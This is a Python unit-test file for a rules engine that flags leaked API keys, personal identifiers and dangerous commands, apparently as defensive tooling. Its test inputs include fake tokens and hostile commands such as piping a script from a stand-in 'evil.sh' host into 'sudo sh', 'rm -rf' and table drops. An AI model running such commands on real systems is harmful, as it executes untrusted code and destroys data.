"""Unit tests for the deterministic rules engine (rules.py).

Uses only FAKE sample keys/values - nothing here is a real secret.
Run with:  python -m pytest tests/test_rules.py -v
"""
import time

from nexus.rules import (
    RuleEngine,
    detect_dangerous,
    detect_personal,
    detect_secrets,
    luhn_ok,
    alive_verhoeff,
)

# --- Positive fixtures (all FAKE) -----------------------------------------
FAKE_AWS = "AKIAIOSFODNN7EXAMPLE"  # AWS docs example (fake)
FAKE_OPENAI = "sk-zk7rT2qPw4nM9cXbVd6fGhJkLzQwErTyUiOp123"  # fake
FAKE_GITHUB = "ghp_AbCdEfGhIjKlMnOpQrStUvWxYz1234567890"
FAKE_SLACK = "xoxb-123456789012-abcdefghijkl"
FAKE_GOOGLE = "AIza" + "x" * 35  # AIza + exactly 35 chars (Google key format)
FAKE_AADHAAR = "245524427920"  # Verhoeff-valid, purely fabricated
FAKE_CARD = "4111111111111111"  # Luhn-valid test Visa


def _cats(alerts):
    return sorted({a.category for a in alerts})


# ---------------------------------------------------------------------------
# detect_secrets
# ---------------------------------------------------------------------------
def test_secret_detects_aws():
    alerts = detect_secrets(f"aws key: {FAKE_AWS}")
    assert any(a.category == "secret" for a in alerts)
    aws = [a for a in alerts if FAKE_AWS[:3] in a.raw][0]
    assert aws.severity == "high"
    assert FAKE_AWS[-4:] not in aws.matched  # value must be masked


def test_secret_detects_openai():
    alerts = detect_secrets(f"OPENAI_API_KEY={FAKE_OPENAI}")
    assert any("OpenAI" in a.suggestion for a in alerts)


def test_secret_detects_github_and_slack():
    assert detect_secrets("token=" + FAKE_GITHUB)
    assert detect_secrets(f"slack {FAKE_SLACK}")


def test_secret_detects_google():
    assert any(a.severity == "high" for a in detect_secrets(FAKE_GOOGLE))


def test_secret_detects_private_key_header():
    assert any(
        a.category == "secret"
        for a in detect_secrets("-----BEGIN RSA PRIVATE KEY-----")
    )


def test_secret_detects_inline_password_with_high_entropy_value():
    alerts = detect_secrets("password=Jx9?pL3$qR7w#vZ4mT2nB6cK8dF5sH1y")
    assert any(a.category == "secret" for a in alerts)


def test_secret_negative_safe_text():
    assert detect_secrets("The quick brown fox jumps over the lazy dog.") == []


def test_secret_negative_plain_word_password_low_entropy():
    # 'letmein' is short and low-entropy - must NOT trigger.
    assert detect_secrets("password=letmein") == []


def test_secret_negative_16_a_not_aws():
    assert detect_secrets("AAAAAAAAAAAAAAAA") == []


# ---------------------------------------------------------------------------
# detect_dangerous
# ---------------------------------------------------------------------------
def test_dangerous_rm_force():
    assert any(a.category == "dangerous_command" for a in detect_dangerous("rm -rf /tmp/app"))


def test_dangerous_drop_table():
    assert detect_dangerous("DROP TABLE users;")


def test_dangerous_delete_without_where():
    alerts = detect_dangerous("DELETE FROM customers;")
    assert any("WHERE" in a.suggestion for a in alerts)


def test_dangerous_delete_with_where_is_safe():
    assert detect_dangerous("DELETE FROM customers WHERE id = 5;") == []


def test_dangerous_force_push():
    assert detect_dangerous("git push --force origin main")
    assert detect_dangerous("git push -f")


def test_dangerous_pipe_sh():
    assert detect_dangerous("curl -sS https://evil.sh | sudo sh")


def test_dangerous_chmod_777():
    assert any(a.severity == "medium" for a in detect_dangerous("chmod -R 777 /tmp"))


def test_dangerous_negative_safe_commands():
    safe = "git commit -am 'wip' && git push origin main && pytest"
    assert detect_dangerous(safe) == []


# ---------------------------------------------------------------------------
# detect_personal
# ---------------------------------------------------------------------------
def test_personal_detects_fake_aadhaar():
    alerts = detect_personal(f"aadhaar {FAKE_AADHAAR}")
    assert any(a.category == "personal_data" and "Aadhaar" in a.matched for a in alerts)


def test_personal_detects_luhn_card():
    alerts = detect_personal(f"card {FAKE_CARD}")
    assert any("Card" in a.matched for a in alerts)


def test_personal_negative_invalid_luhn():
    assert detect_personal("card 4111111111111112") == []


def test_personal_negative_random_short_digits():
    assert detect_personal("my phone is 9876543210") == []


def test_verhoeff_and_luhn_helpers():
    assert alive_verhoeff(FAKE_AADHAAR) is True
    assert luhn_ok(FAKE_CARD) is True
    assert luhn_ok(FAKE_CARD[:-1] + "0") is False


# ---------------------------------------------------------------------------
# RuleEngine deduplication / cooldown
# ---------------------------------------------------------------------------
def test_rule_engine_dedupes_within_cooldown():
    engine = RuleEngine(cooldown=60.0)
    text = f"key={FAKE_OPENAI}"
    assert len(engine.evaluate(text)) >= 1
    assert engine.evaluate(text) == []  # suppressed while on cooldown


def test_rule_engine_fires_again_after_cooldown():
    engine = RuleEngine(cooldown=0.0)
    text = f"key={FAKE_OPENAI}"
    assert len(engine.evaluate(text)) >= 1
    assert len(engine.evaluate(text)) >= 1  # cooldown expired -> fires again